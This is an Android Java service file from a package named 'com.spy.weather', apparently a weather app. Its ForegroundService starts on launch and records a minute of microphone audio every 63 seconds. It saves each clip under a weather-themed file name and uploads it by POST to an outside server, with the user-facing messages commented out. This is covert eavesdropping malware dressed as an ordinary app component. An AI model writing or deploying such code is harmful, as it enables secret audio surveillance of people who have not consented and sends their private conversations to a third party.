package com.spy.weather;

import android.app.Service;


import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import java.io.File;
import java.io.IOException;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

import cz.msebera.android.httpclient.Header;


public class ForegroundService extends Service {
    public static final String CHANNEL_ID = "ForegroundServiceChannel";
    final Handler handler = new Handler();
    Timer timer = new Timer();


    public static final int REQUEST_AUDIO_PERMISSION_CODE = 1;

    private String url = "http://faldukan.com/weather/saveAudio.php";
    MediaPlayer mediaPlayer;
    private MediaRecorder rec;

    @Override
    public void onCreate() {
        super.onCreate();


        start();
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {


        if (intent.getAction().equals("StopService")) {
            stopForeground(true);
            stopSelf();
            stopRecord();
        }else{
            Log.i("Location :","onStartCommand CALLED IN SERVICE ");
            String input = intent.getStringExtra("inputExtra");
            createNotificationChannel();
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this,
                    0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle("Foreground Service")
                    .setContentText(input)
                    .setContentIntent(pendingIntent)
                    .build();
            startForeground(1, notification);

        }






        //do heavy work on a background thread
        //stopSelf();
        return START_REDELIVER_INTENT;
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "ForegroundServiceChannel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }




    public void record(){
        String file_path=getApplicationContext().getFilesDir().getPath();

        File file= new File(file_path);

        Long date=new Date().getTime();
        Date current_time = new Date(Long.valueOf(date));

        rec=new MediaRecorder();

        rec.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
        rec.setAudioChannels(1);
        rec.setAudioSamplingRate(8000);
        rec.setAudioEncodingBitRate(44100);
        rec.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        rec.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        if (!file.exists()){
            file.mkdirs();
        }

        String file_name=file+"/weather1"+".mp3";
        rec.setOutputFile(file_name);

        try {
            rec.prepare();
        } catch (IOException e) {
            e.printStackTrace();
           // Toast.makeText(ForegroundService.this,"Sorry! file creation failed!"+e.getMessage(),Toast.LENGTH_SHORT).show();
            return;
        }
        rec.start();
       // Toast.makeText(ForegroundService.this,"Record started",Toast.LENGTH_SHORT).show();
        final Handler handlerr = new Handler();
        handlerr.postDelayed(new Runnable() {
            @Override
            public void run() {

                if (null != rec) {
                    try{

                        rec.stop();
                        rec.reset();
                        sendAudio(file_name);
                    }catch(RuntimeException ex){
                        Log.i("ApiCalled","in catch of save audio"+ex.toString());
                    }
                }



            }
        }, 60000);

    }



    void start(){
        SharedPreferences.Editor editor = getSharedPreferences("Check", MODE_PRIVATE).edit();
        editor.putString("started", "yes");
        editor.apply();


        TimerTask doAsynchronousTask = new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    public void run() {
                        try {

                           record();
                        } catch (Exception e) {
                            Log.i("ApiCalled","in catch of start"+e.toString());
                        }
                    }
                });
            }
        };
        timer.schedule(doAsynchronousTask, 0, 63000);




    }


    private void sendAudio(String selectedPath) {

        try{



            File file=new File(selectedPath);


            RequestParams params = new RequestParams();
            params.put("audio",file);
            Log.i("ApiCalled",file.toString());
            AsyncHttpClient client = new AsyncHttpClient();
            client.post(url, params,new AsyncHttpResponseHandler() {
                @Override
                public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {


                    String s=new String(responseBody);


                    Log.i("ApiCalled",s.toString());

                   // Toast.makeText(ForegroundService.this,s,Toast.LENGTH_LONG).show();

                }

                @Override
                public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {

                    //Toast.makeText(ForegroundService.this,error.toString(),Toast.LENGTH_LONG).show();
                    Log.i("ApiCalled",error.toString());

                }
            });

        }
        catch (Exception e)
        {

        }
    }


    void stopRecord() {
        if (null != rec) {
            try {
                Log.i("ApiCalled", "recoerder stopped ");
                rec.stop();
                rec.reset();
            } catch (RuntimeException ex) {
                Log.i("ApiCalled", "in catch of save audio0000" + ex.toString());
            }
        }


    }

}
